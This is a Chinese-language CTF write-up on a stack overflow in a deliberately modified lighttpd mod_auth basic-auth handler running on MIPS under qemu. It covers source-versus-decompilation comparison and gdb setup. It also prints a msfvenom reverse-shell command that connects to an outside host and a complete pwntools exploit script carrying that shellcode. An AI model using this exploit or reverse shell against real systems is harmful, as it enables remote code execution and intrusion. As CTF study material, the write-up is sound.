---
aliases:
  - CTF
  - IOT
---
## 0x00 前言
本题是矩阵杯的一道CTF题，题目很贴心的给了dockfile，自己再配个docker-compose就可以进行调试了
```
version: "3"
services:
  pwn:
    build: .
    restart: unless-stopped
    cap_add:
      - SYS_PTRACE
    ports:
      - "38888:80"
      - "12345:1234" #调试端口
```

## 0x10 前期准备
start.sh
```shell
#!/bin/sh
CMD="./qemu-mipsel-static"
ARGS="-g 1234 -L ./ ./server/sbin/lighttpd -D -m ./server/lib -f ./rhttpd/lighttpd/lighttpd.conf"
START_CMD="$CMD $ARGS"

while true; do
  if ! pgrep -f "$CMD $ARGS" > /dev/null; then
    echo "Process not found. Restarting..."
    # 重启进程
    cd /home/ctf 
    ./qemu-mipsel-static -g 1234 -L ./ ./server/sbin/lighttpd -D -m ./server/lib -f ./rhttpd/lighttpd/lighttpd.conf
  fi
  sleep 1
done
```

## 0x20 漏洞挖掘
由于是开源组件lighttpd,因此可以再往上找到其开源版本，题目所使用的版本是lighttpd 1.4.76, 根据这个版本去下载对应的源代码，根据题目所给到的提示以及暗示，不难发现其关键输入为：`mod_auth` 模块的`basic` 认证,对模块进行逆向可以发现处理函数为：`mod_auth_check_basic`
```c
if ( !a4 || !*(_DWORD *)(a4 + 4) )
    return mod_auth_basic_misconfigured(a1, a4);
  v11 = (_DWORD *)http_header_request_get(a1, 10, "Authorization", 13);
  if ( !v11 || !buffer_eq_icase_ssn(*v11, "Basic ", 6) )
    return mod_auth_send_401_unauthorized_basic(a1, *(_DWORD *)(a3 + 4));
  n = buffer_clen((int)v11) - 6;
  n = li_base64_dec(v17, 1024, *v11 + 6, n, 0);
  if ( n )
  {
```
与源码进行对比可以发现：
```c
/* base64-decode Authorization into username:password string;
* limit base64-decoded username:password string to fit into 1k buf */
if (ulen > 1363) /*(1363/4*3+3 = 1023)*/
        return mod_auth_send_401_unauthorized_basic(r, require->realm);
    /* coverity[overflow_sink : FALSE] */
    ulen = li_base64_dec((unsigned char *)user, sizeof(user),
                         vb->ptr+sizeof("Basic ")-1, ulen, BASE64_STANDARD);
    if (0 == ulen) {
        log_error(r->conf.errh, __FILE__, __LINE__,
          "decoding base64-string failed %s", vb->ptr+sizeof("Basic ")-1);
        return mod_auth_send_400_bad_request(r);
    }
```
可以发现其去掉了：`ulen>1363` 这一部分的判断，导致这个函数存在溢出，因为当basic 后跟的base64字符串长度在大于1363的时候会导致解出来的字符串长度大于1024从而导致user变量的栈溢出
```c
size_t ulen = buffer_clen(vb) - (sizeof("Basic ")-1);
size_t pwlen;
char *pw;
char user[1024];
```
我们观察解码函数源码可以发现该函数其实对这种情况还是做了限制：
```c
size_t li_base64_dec(unsigned char * const result, const size_t out_length, const char * const in, const size_t in_length, const base64_charset charset) {
    const unsigned char *un = (const unsigned char *)in;
    const unsigned char * const end = un + in_length;
    const signed char * const base64_reverse_table = (charset)
      ? base64_url_reverse_table                     /* BASE64_URL */
      : base64_standard_reverse_table;               /* BASE64_STANDARD */

    int_fast32_t ch = 0;
    int_fast32_t out4 = 0;
    size_t i = 0;
    size_t out_pos = 0;
    for (; un < end; ++un) {
        ch = (*un < 128) ? base64_reverse_table[*un] : -1;
        if (__builtin_expect( (ch < 0), 0)) {
            /* skip formatted base64; skip whitespace ('\r' '\n' '\t' ' ')*/
            if (-2 == ch) /*(loose check; skip ' ', all ctrls not \127 or \0)*/
                continue; /* skip character */
            break;
        }

        out4 = (out4 << 6) | ch;
        if ((++i & 3) == 0) {
            result[out_pos]   = (out4 >> 16) & 0xFF;
            result[out_pos+1] = (out4 >>  8) & 0xFF;
            result[out_pos+2] = (out4      ) & 0xFF;
            out_pos += 3;
            out4 = 0;
        }
    }

    /* permit base64 string ending with pad chars (ch == -3); not checking
     * for one or two pad chars + optional whitespace reaches in_length) */
    /* permit base64 string truncated before in_length (*un == '\0') */
    switch (un == end || ch == -3 || *un != '\0' ? (i & 3) : 1) {
      case 3:
        result[out_pos++] = (out4 >> 10);
        out4 <<= 2;
        __attribute_fallthrough__
      case 2:
        result[out_pos++] = (out4 >> 4) & 0xFF;
        __attribute_fallthrough__
      case 0:
        force_assert(out_pos <= out_length);
        return out_pos;
      case 1: /* pad char or str end can only come after 2+ base64 chars */
      default:
        return 0; /* invalid character, abort */
    }
}

#define force_assert(x) ck_assert(x)
```
但当我们输入长度超过1363并且完成decode之后还是会溢出，这是什么情况呢，通过逆向`lighttpd`程序的`li_base64_dec`函数可以发现这里面并没有`ck_assert`函数：
```c
int __fastcall li_base64_dec(int a1, int a2, _BYTE *a3, int a4, int a5)
{
  char *v5; // $v0
  int v6; // $v0
  int v7; // $v0
  int v8; // $v0
  int v9; // $v0
  int v10; // $v0
  int v11; // $v0
  int v12; // $v0
  _BYTE *v14; // [sp+8h] [+8h]
  int v15; // [sp+Ch] [+Ch]
  int v16; // [sp+10h] [+10h]
  char v17; // [sp+14h] [+14h]
  int v18; // [sp+18h] [+18h]
  _BYTE *v19; // [sp+1Ch] [+1Ch]
  char *v20; // [sp+20h] [+20h]

  v14 = a3;
  v19 = &a3[a4];
  if ( a5 )
    v5 = (char *)&base64_url_reverse_table;
  else
    v5 = (char *)&base64_standard_reverse_table;
  v20 = v5;
  v15 = 0;
  v16 = 0;
  v17 = 0;
  v18 = 0;
  while ( v14 < v19 )
  {
    if ( (char)*v14 < 0 )
      v6 = -1;
    else
      v6 = v20[(unsigned __int8)*v14];
    v15 = v6;
    if ( v6 >= 0 )
    {
      v16 = v6 | (v16 << 6);
      if ( (++v17 & 3) == 0 )
      {
        if ( BYTE2(v16) )
        {
          v7 = v18++;
          *(_BYTE *)(a1 + v7) = BYTE2(v16);
        }
        if ( BYTE1(v16) )
        {
          v8 = v18++;
          *(_BYTE *)(a1 + v8) = BYTE1(v16);
        }
        if ( (_BYTE)v16 )
        {
          v9 = v18++;
          *(_BYTE *)(a1 + v9) = v16;
        }
        v16 = 0;
      }
    }
    else if ( v6 != -2 )
    {
      break;
    }
    ++v14;
  }
  if ( v14 == v19 || v15 == -3 || *v14 )
    v10 = v17 & 3;
  else
    v10 = 1;
  if ( v10 == 2 )
    goto LABEL_33;
  if ( v10 == 3 )
  {
    if ( (unsigned __int8)(v16 >> 10) )
    {
      v11 = v18++;
      *(_BYTE *)(a1 + v11) = v16 >> 10;
    }
    v16 *= 4;
LABEL_33:
    if ( (unsigned __int8)(v16 >> 4) )
    {
      v12 = v18++;
      *(_BYTE *)(a1 + v12) = v16 >> 4;
    }
    return v18;
  }
  if ( v10 )
    return 0;
  return v18;
}
```
因此可以猜想是出题人去除了`force_assert(out_pos <= out_length);`的判断，并将其编译为mips 32架构，导致可以完成利用
自此漏洞点我们已经确定，接下来就是对漏洞进行利用了

## 0x30 调试
gdb调试脚本：
```
sudo gdb ./usr/local/sbin/lighttpd -x x
set follow-fork-mode child
set detach-on-fork off
set architecture mips
set endian little
b li_base64_dec
target remote 192.168.100.101:12345
```
![](images/Pasted%20image%2020240605125516.png)
设置调试，进程卡住就kill掉
将usr下面的lib放到server下，保证可以将文件解读出来
![](images/Pasted%20image%2020240605125635.png)
## 0x40 漏洞利用
程序使用qemu启动，漏洞位于`mod_auth`
查看其对应架构：
![](images/Pasted%20image%2020240604170223.png)
进程重启地址会发生变动,但实际调试过程中发现地址其实不会发生变化
![](images/Pasted%20image%2020240605125827.png)
调试发现并不能直接返回：
在函数代码段找到：

```
   0x3fdf18d8 <mod_auth_check_basic+1600>    move   $sp, $fp
   0x3fdf18dc <mod_auth_check_basic+1604>    lw     $ra, 0x45c($sp)
   0x3fdf18e0 <mod_auth_check_basic+1608>    lw     $fp, 0x458($sp)
   0x3fdf18e4 <mod_auth_check_basic+1612>    addiu  $sp, $sp, 0x460
 ► 0x3fdf18e8 <mod_auth_check_basic+1616>    jr     $ra                           <0x44444444>
```
可以控制跳转地址了,把shellcode放到栈上或者放到User-Agent上就可以执行shellcode了，由于shellcode在子进程中执行，所以看不到回显，使用msf生成一个reverse shell code 来进行执行
`msfvenom -p linux/mipsle/shell_reverse_tcp LHOST=111.111.111.111 LPORT=8888 -f python -o shell`
并且调整栈结构使其跳转到shellcode上：
最终exp:
```python
#coding:utf-8

import base64
# import requests
from pwn import *

context.update(arch = 'mips', bits = 32, endian = 'little', os = 'linux')

def exp(host,port):
	sh = remote(host,port=port)
	buf =  b""
	buf += b"\xfa\xff\x0f\x24\x27\x78\xe0\x01\xfd\xff\xe4\x21\xfd"
	buf += b"\xff\xe5\x21\xff\xff\x06\x28\x57\x10\x02\x24\x0c\x01"
	buf += b"\x01\x01\xff\xff\xa2\xaf\xff\xff\xa4\x8f\xfd\xff\x0f"
	buf += b"\x34\x27\x78\xe0\x01\xe2\xff\xaf\xaf\x34\x19\x0e\x3c"
	buf += b"\x34\x19\xce\x35\xe4\xff\xae\xaf\x01\x01\x0e\x3c\x7f"
	buf += b"\x01\xce\x35\xe6\xff\xae\xaf\xe2\xff\xa5\x27\xef\xff"
	buf += b"\x0c\x24\x27\x30\x80\x01\x4a\x10\x02\x24\x0c\x01\x01"
	buf += b"\x01\xfd\xff\x11\x24\x27\x88\x20\x02\xff\xff\xa4\x8f"
	buf += b"\x21\x28\x20\x02\xdf\x0f\x02\x24\x0c\x01\x01\x01\xff"
	buf += b"\xff\x10\x24\xff\xff\x31\x22\xfa\xff\x30\x16\xff\xff"
	buf += b"\x06\x28\x62\x69\x0f\x3c\x2f\x2f\xef\x35\xec\xff\xaf"
	buf += b"\xaf\x73\x68\x0e\x3c\x6e\x2f\xce\x35\xf0\xff\xae\xaf"
	buf += b"\xf4\xff\xa0\xaf\xec\xff\xa4\x27\xf8\xff\xa4\xaf\xfc"
	buf += b"\xff\xa0\xaf\xf8\xff\xa5\x27\xab\x0f\x02\x24\x0c\x01"
	buf += b"\x01\x01"
	pl = "AAAA"+"AAAA"+"BBBB"+p32(0x407ffea8)+p32(0x407ffa94)+p32(0x004a8e98)
	data=buf.ljust(0x400,"A")+ pl+ ":"
	payload = base64.b64encode(data)
	print(payload)
	package = """GET /www/index.html HTTP/1.1\r
Host: 192.168.100.102:38888\r
Authorization: Basic %s\r
Upgrade-Insecure-Requests: 1\r
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36\r
Connection: close\r

"""  % payload
	log.info("sending payload")
	log.info(package[:0x100])

	sh.send(package.encode())
	res = sh.recv()
	log.info(res)
	return

if __name__=="__main__":
	exp("127.0.0.1",38888)

"""

"""
```
因为没打过远程所以不知道远程环境，测试在不同的机器上栈地址不一样，不过也可以将shellcode放在一个全局变量里去执行，需要注意的是如果放在base64里面，那么shellcode中不能含有空字符`\x00` 这里我将其替换为了`\x01`，不影响shellcode的最终执行，不出网则需要修改shellcode来执行系统命令或者将flag写入网站文件中进行下载，这里不做尝试了
![](images/Pasted%20image%2020240607124314.png)